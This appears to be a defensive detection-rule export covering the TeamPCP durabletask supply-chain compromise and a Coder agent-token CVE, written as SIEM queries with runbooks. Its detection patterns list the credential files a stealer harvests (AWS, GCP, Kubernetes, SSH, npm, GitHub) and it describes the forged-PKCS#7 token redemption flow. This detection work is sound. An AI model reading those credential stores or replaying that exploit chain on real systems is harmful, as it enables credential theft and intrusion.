TeamPCP rope.pyz Dropper Infection Markers on Linux AIInstallation High
Detects creation of TeamPCP's on-disk artifacts from the durabletask compromise: the rope.pyz / managed.pyz dropper payloads in /tmp/ and the ~/.cache/.sys-update-check infection marker. Article-specific because rope.pyz is named verbatim in code block 3. Rationale: Anchors on the verbatim 'rope.pyz' filename from article code block 3, plus the marker files /tmp/managed.pyz and ~/.cache/.sys-update-check confirmed by Wiz, safedep, and Aikido as the dropper's on-disk artifacts. None of these paths/filenames have legitimate Linux usage — they are unique to this campaign. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1105 T1036.005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • IR team copying the captured rope.pyz sample to /tmp/ on a forensics box for analysis
  • Security researcher unpacking the artifact in a sandbox VM
  • Malware-zoo / yara-rule build machine syncing samples
  • Backup restore of an already-infected host into a clean environment (file re-created during restore)
  • File-recovery tool replaying journal entries that include the dropper write
Suppression filter
| where not (DeviceName has_any ("forensics","malware-lab","sandbox","yara-builder") and InitiatingProcessAccountName in~ ("ir-analyst","malware-research"))
Response runbook
Step 1 (Triage): Compute SHA-256 of the dropped file and compare to the public IOC 069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce. Identify the writing process (almost always python/pip when caused by durabletask). Step 2 (Contain): Isolate host. Kill any live python process descended from the install. Delete the marker files only AFTER capturing forensic copies. Step 3 (Hunt): Search for AWS SSM SendCommand from this host's IAM role (UC4), kubectl exec from this host's kubeconfig context, and any Python access to ~/.aws/credentials, ~/.config/gcloud/, ~/.kube/config in the surrounding hour (UC5).
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has "/tmp/" and (FileName matches regex @"^rope-.+\.pyz$" or FileName =~ "rope.pyz" or FileName =~ "managed.pyz"))
    or (FolderPath has "/.cache/" and FileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256, FileSize
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where (TargetFilePath has "/tmp/" and (TargetFileName matches regex @"^rope-.+\.pyz$" or TargetFileName =~ "rope.pyz" or TargetFileName =~ "managed.pyz"))
    or (TargetFilePath has "/.cache/" and TargetFileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc
title: TeamPCP rope.pyz Dropper Artifact on Linux (durabletask Supply Chain)
id: e3a7b1d4-9c2e-4f6a-b8d5-1e3c7a9b5d2f
description: Detects creation of TeamPCP infection markers used by the durabletask PyPI supply-chain compromise — /tmp/rope-*.pyz, /tmp/managed.pyz dropper files or the ~/.cache/.sys-update-check infection marker.
references:
  - https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack
  - https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.t1105
  - attack.execution
logsource:
  category: file_event
  product: linux
detection:
  selection_dropper:
    TargetFilename|contains:
      - '/tmp/rope-'
      - '/tmp/managed.pyz'
      - '/tmp/rope.pyz'
  selection_marker:
    TargetFilename|contains:
      - '/.cache/.sys-update-check'
  condition: selection_dropper or selection_marker
level: high
source:(linux.auditd OR linux.syslog OR windows.sysmon) (@file.path:(*/tmp/rope-*.pyz OR */tmp/rope.pyz OR */tmp/managed.pyz OR */.cache/.sys-update-check OR */.cache/.sys-update-check-k8s) OR @TargetFilename:(*\/tmp\/rope-*.pyz OR *\/tmp\/managed.pyz OR */.cache/.sys-update-check*))
#event_simpleName=FileWritten TargetFileName=/(\/tmp\/rope(-[^\/]+)?\.pyz|\/tmp\/managed\.pyz|\/\.cache\/\.sys-update-check(-k8s)?$)/i
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
| Hash:=SHA256HashData
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="/tmp/rope-*.pyz" OR Filesystem.file_path="/tmp/managed.pyz" OR Filesystem.file_path="*/.cache/.sys-update-check" OR Filesystem.file_path="*/.cache/.sys-update-check-k8s" OR Filesystem.file_name="rope.pyz" OR Filesystem.file_name="managed.pyz" OR Filesystem.file_name=".sys-update-check" OR Filesystem.file_name=".sys-update-check-k8s") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path Filesystem.file_name Filesystem.file_hash _time | `drop_dm_object_name(Filesystem)` | sort 0 -_time
| tstats summariesonly=false count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="/tmp/rope-*.pyz" OR Filesystem.file_path="/tmp/managed.pyz" OR Filesystem.file_path="*/.cache/.sys-update-check" OR Filesystem.file_path="*/.cache/.sys-update-check-k8s" OR Filesystem.file_name="rope.pyz" OR Filesystem.file_name="managed.pyz" OR Filesystem.file_name=".sys-update-check" OR Filesystem.file_name=".sys-update-check-k8s") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path Filesystem.file_name Filesystem.file_hash _time | `drop_dm_object_name(Filesystem)` | sort 0 -_time
AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) AIActions on Objectives Medium
Detects the durabletask worm's lateral-movement stage: a single EC2-instance IAM role calling ssm:SendCommand against multiple EC2 instances within a short window. The rope.pyz worm uses stolen instance-role credentials to push itself to peer instances via SSM RunCommand. Rationale: Captures the worm's worm-stage primitive (ssm:SendCommand from an instance role to peer instances) which Wiz and safedep flagged as the AWS-specific propagation method. CloudTrail-only — Defender XDR and Falcon FDR don't ingest AWS control-plane events, hence empty defender_kql / falcon_logscale_query. Sentinel has the AWSCloudTrail connector but the table isn't in our canonical schema, so left empty rather than guess column names. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
ATT&CKT1021.007 T1651 T1078.004
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • AWS Systems Manager Patch Manager performing batch patching across an instance fleet
  • AWS Config Conformance Pack remediation calling SendCommand for compliance fixes
  • SSM Automation document execution as part of a scheduled maintenance window
  • IaC tooling (Ansible AWX, Salt) using an SSM-based connection broker against a fleet
  • Operations runbook running an `aws ssm send-command` from a jump host across many instances
Suppression filter
| where source_role!="AWSServiceRoleForAmazonSSM*" AND source_role!="*PatchManager*" AND source_role!="*ConfigRecorder*" AND 'requestParameters.documentName'!="AWS-RunPatchBaseline" AND 'requestParameters.documentName'!="AWS-UpdateSSMAgent"
Response runbook
Step 1 (Triage): Confirm the calling IAM role is an EC2 instance role (not a human user, not a service like Patch Manager). Look up the source EC2 instance via instance-profile-arn lookup. Check whether that source instance shows the rope.pyz markers (UC3). Step 2 (Contain): Revoke the instance-profile session credentials (call `aws iam delete-role-session` or terminate the instance). Pause the SSM document/association on the source role. Step 3 (Hunt): Pull the SendCommand `parameters.commands` payload — TeamPCP base64-embeds the curl-to-check.git-service.com fetcher. For each instance in `requestParameters.instanceIds`, run UC3 (infection-marker hunt) to confirm worm spread.
source:cloudtrail @evt.name:SendCommand @userIdentity.type:AssumedRole @requestParameters.instanceIds:* (-@userAgent:(*aws-cli/* AND *root/*) AND -@userIdentity.sessionContext.sessionIssuer.userName:(*ssm-automation* OR *patch-manager* OR *config-rule*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource="ssm.amazonaws.com" "userIdentity.type"="AssumedRole" 
| eval source_role=mvindex(split('userIdentity.sessionContext.sessionIssuer.arn',"/"),-1)
| eval target_count=mvcount('requestParameters.instanceIds{}')
| stats latest(_time) as last_seen dc('requestParameters.instanceIds{}') as DistinctTargets values('requestParameters.instanceIds{}') as Targets values(sourceIPAddress) as SourceIPs values(userAgent) as UAs by source_role 'userIdentity.arn' awsRegion
| where DistinctTargets >= 3 OR like(source_role, "%ec2%") OR like(source_role, "%-instance-%")
| sort 0 -last_seen
Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) AIActions on Objectives Medium
Detects a single Python process opening credential files from THREE OR MORE distinct cloud/dev ecosystems within a 5-minute window — the signature behaviour of the rope.pyz multi-cloud stealer that harvests AWS, Azure, GCP, Kubernetes, npm, GitHub, Docker, and SSH secrets in one pass. Rationale: Targets the rope.pyz second-stage behaviour that Wiz and safedep documented: a single python process enumerating credentials across AWS + Azure + GCP + Kubernetes + npm + GitHub + Docker + SSH within seconds. The DistinctSecretFamilies>=3 threshold eliminates legitimate cloud SDKs that touch one ecosystem at a time while still catching the multi-cloud stealer in a single hit. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1552.001 T1555.005 T1528
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Multi-cloud Terraform/Pulumi runs that initialise AWS+Azure+GCP providers (python child of terraform/pulumi)
  • Cloud-cost-management tools like Infracost or CloudHealth agent that read all provider credentials
  • Backup tooling (Restic, Velero) that needs credentials for multi-cloud target buckets
  • Developer running `cloudquery sync` or `steampipe query` against multiple providers
  • An IaC validation script (Checkov, tfsec) being pointed at a multi-cloud config tree
Suppression filter
| where not (Cmd has_any ("terraform","pulumi","ansible","checkov","tfsec","infracost","cloudquery","steampipe","velero","restic")) and not (InitiatingProcessParentFileName in~ ("terraform","pulumi","ansible-playbook"))
Response runbook
Step 1 (Triage): Capture the python process tree and command line. If parent is pip/durabletask install context OR the process is short-lived (<60s wall time) with no TTY, treat as confirmed stealer. If parent is terraform/pulumi/ansible/checkov/restic, likely benign — verify the binary's parent. Step 2 (Contain): Kill the process. Rotate all credentials in each SecretFamily the process touched (AWS access keys, Azure SP secrets, GCP service-account keys, kubeconfig tokens, npm tokens, GitHub PATs). Step 3 (Hunt): Pivot to UC2 (look for any subsequent egress to check.git-service.com from the host) and UC4 (check AWS SSM SendCommand from any of the rotated AWS IAM principals during the exposure window). Audit GitHub PAT use across the org for anomalous repo-clone bursts.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileOpened","FileCreated","FileRenamed")
| where InitiatingProcessFileName in~ ("python","python3","python3.10","python3.11","python3.12")
| extend SecretFamily = case(
    FolderPath has "/.aws/","aws",
    FolderPath has "/.azure/","azure",
    FolderPath has "/.config/gcloud/","gcp",
    FolderPath has "/.kube/","k8s",
    FolderPath has "/.docker/","docker",
    FileName =~ ".npmrc","npm",
    FileName =~ ".git-credentials","git",
    FolderPath has "/.config/gh/" and FileName =~ "hosts.yml","gh",
    FolderPath has "/.ssh/" and FileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(strcat(FolderPath,"/",FileName), 20), Cmd = any(InitiatingProcessCommandLine), arg_min(Timestamp, *) by DeviceName, InitiatingProcessAccountName, InitiatingProcessId, bin(Timestamp, 5m)
| where DistinctSecretFamilies >= 3
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("python","python3")
| extend SecretFamily = case(
    TargetFilePath has "/.aws/","aws",
    TargetFilePath has "/.azure/","azure",
    TargetFilePath has "/.config/gcloud/","gcp",
    TargetFilePath has "/.kube/","k8s",
    TargetFilePath has "/.docker/","docker",
    TargetFileName =~ ".npmrc","npm",
    TargetFileName =~ ".git-credentials","git",
    TargetFilePath has "/.config/gh/" and TargetFileName =~ "hosts.yml","gh",
    TargetFilePath has "/.ssh/" and TargetFileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(TargetFilePath, 20), Cmd = any(ActingProcessCommandLine), arg_min(TimeGenerated, *) by DvcHostname, ActorUsername, ActingProcessId, bin(TimeGenerated, 5m)
| where DistinctSecretFamilies >= 3
| order by TimeGenerated desc
source:linux.auditd (@auditd.type:OPENAT OR @auditd.type:PATH) @process.executable.path:(*/python OR */python3 OR */python3.*) @file.path:(*/.aws/credentials OR */.aws/config OR */.azure/accessTokens.json OR */.azure/azureProfile.json OR */.config/gcloud/credentials.db OR */.config/gcloud/application_default_credentials.json OR */.kube/config OR */.npmrc OR */.docker/config.json OR */.git-credentials OR */.config/gh/hosts.yml OR */.ssh/id_*)
#event_simpleName=FileOpenInfo ContextImageFileName=/\/python3?(\.\d+)?$/i TargetFileName=/(\/\.aws\/(credentials|config)|\/\.azure\/(accessTokens|azureProfile)\.json|\/\.config\/gcloud\/(credentials\.db|application_default_credentials\.json)|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json|\/\.git-credentials|\/\.config\/gh\/hosts\.yml|\/\.ssh\/id_)/i
| case {
    TargetFileName=/\.aws\// | SecretFamily:="aws";
    TargetFileName=/\.azure\// | SecretFamily:="azure";
    TargetFileName=/gcloud\// | SecretFamily:="gcp";
    TargetFileName=/\.kube\// | SecretFamily:="k8s";
    TargetFileName=/\.docker\// | SecretFamily:="docker";
    TargetFileName=/\.npmrc/ | SecretFamily:="npm";
    TargetFileName=/\.git-credentials|\.config\/gh\// | SecretFamily:="git";
    TargetFileName=/\.ssh\/id_/ | SecretFamily:="ssh";
    *;
  }
| groupBy([aid, ComputerName, ContextProcessId], function=[count(field=SecretFamily, distinct=true, as=DistinctFamilies), collect([SecretFamily, TargetFileName])])
| DistinctFamilies>=3

| tstats summariesonly=false count from datamodel=Endpoint.Filesystem where Filesystem.process_name IN ("python","python3","python3.10","python3.11","python3.12") AND (Filesystem.file_path="*/.aws/credentials" OR Filesystem.file_path="*/.aws/config" OR Filesystem.file_path="*/.azure/accessTokens.json" OR Filesystem.file_path="*/.azure/azureProfile.json" OR Filesystem.file_path="*/.config/gcloud/credentials.db" OR Filesystem.file_path="*/.config/gcloud/application_default_credentials.json" OR Filesystem.file_path="*/.kube/config" OR Filesystem.file_path="*/.npmrc" OR Filesystem.file_path="*/.docker/config.json" OR Filesystem.file_path="*/.git-credentials" OR Filesystem.file_path="*/.config/gh/hosts.yml" OR Filesystem.file_path="*/.ssh/id_*") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.process_id Filesystem.file_path _time | `drop_dm_object_name(Filesystem)` | bin _time span=5m | stats dc(file_path) as DistinctSecretFamilies values(file_path) as Paths min(_time) as first by dest user process_id _time | where DistinctSecretFamilies >= 3 | sort 0 -first
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-46412")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Coder CVE-2026-46354 - Burst of azure-instance-identity POSTs (vmId enumeration / forged PKCS#7) AIExploitation Medium
Detects multiple POST requests to the unauthenticated /api/v2/workspaceagents/azure-instance-identity endpoint from a single source within a short window — the signature of an attacker enumerating workspace vmId UUIDs to brute-force-redeem agent tokens via the forged PKCS#7 envelope flaw. A legitimate Coder workspace agent only registers once per VM lifetime, so >=5 POSTs to this exact path from one source in 10 minutes is anomalous. Rationale: The endpoint path is uniquely identified in the advisory as the unauthenticated PKCS#7 verification entry point. Burst-from-one-source on this specific path is the visible HTTP-layer shape of vmId UUID enumeration described in the article. Cross-checked Coder's public API docs at coder.com/docs/reference/api/agents to confirm the endpoint exists in legitimate v2 deployments. Defender Advanced Hunting has no native HTTP request log for self-hosted Coder, so defender_kql is intentionally empty. Falcon LogScale FDR does not ship application-layer HTTP request URLs from Coder, so falcon_logscale_query is also empty. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://github.com/coder/coder/pull/25286
ATT&CKT1190 T1133
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Bulk workspace provisioning by Coder admin spinning up many Azure VM workspaces concurrently
  • Coder agent retry loop after a transient TLS / certificate issue on the Azure VM
  • Internal uptime probe or synthetic health-check hammering the registration endpoint
  • Load-test traffic against a Coder staging instance from a CI runner
  • Misconfigured agent autoscaler restarting agents in a hot loop
Suppression filter
| where DistinctUserAgents > 1 or Successes > 0    // suppress single-agent retry loops; an attacker enumerating vmIds typically reuses one UA but hits multiple 200s
Response runbook
1) TRIAGE: confirm Coder server version against the patched list (v2.33.3, v2.32.2, v2.31.12, v2.30.8, v2.29.13, v2.24.5) — if patched, lower priority. Check whether the source IP belongs to the org's Azure subscription IP ranges; pull the request bodies from the reverse proxy if body capture is enabled to see the claimed vmIds. 2) CONTAIN: if unpatched, block the source IP at the WAF and switch all Azure templates to token-based agent auth (set coder_agent.auth="token" and pass CODER_AGENT_TOKEN env var) per the advisory workaround. Rotate the workspace agent tokens for any vmId observed in successful (200) responses. 3) HUNT: from the same source IPs, search forward 30 minutes for GETs to /workspaceagents/me/gitsshkey or /me/external-auth (UC2) to determine whether tokens were redeemed; rotate the org's GitHub/GitLab/Bitbucket OAuth tokens and replace exposed workspace SSH keys.
let WindowMin = 10m;
let Threshold = 5;
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod == "POST"
| where Url has "/api/v2/workspaceagents/azure-instance-identity"
| summarize Attempts = count(),
            Successes = countif(HttpStatusCode in ("200","204")),
            DistinctUserAgents = dcount(HttpRequestHeaderUserAgent),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
            by SrcIpAddr, DstHostname, bin(TimeGenerated, WindowMin)
| where Attempts >= Threshold
| order by Attempts desc
source:(nginx OR apache OR cloudfront OR alb OR azure.appservices) @http.method:POST @http.url_details.path:"/api/v2/workspaceagents/azure-instance-identity"
CLOUD

Coder CVE-2026-46354 - Agent token redemption: PKCS#7 POST followed by gitsshkey / external-auth GET AIActions on Objectives High
Correlates a POST to /api/v2/workspaceagents/azure-instance-identity with a GET to /workspaceagents/me/gitsshkey or /workspaceagents/me/external-auth from the same source IP within 30 minutes — the exact two-step attack flow the advisory documents (forge PKCS#7 envelope → use returned agent session token to pull Git SSH private key and OAuth credentials). This catches the credential-access stage even when a single vmId is targeted (UC1's burst signal misses). Rationale: The advisory explicitly chains POST /azure-instance-identity (token issuance) to GET /me/gitsshkey and GET /me/external-auth (credential read) as the documented post-exploit steps. Same-source-IP join with a 30-minute window captures the attacker round-trip while remaining tight enough to drop unrelated traffic. Endpoints confirmed in Coder's public API reference. Defender XDR lacks application HTTP logs for self-hosted Coder; Falcon FDR same — both left empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://coder.com/docs/admin/external-auth
ATT&CKT1528 T1552.004 T1190
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
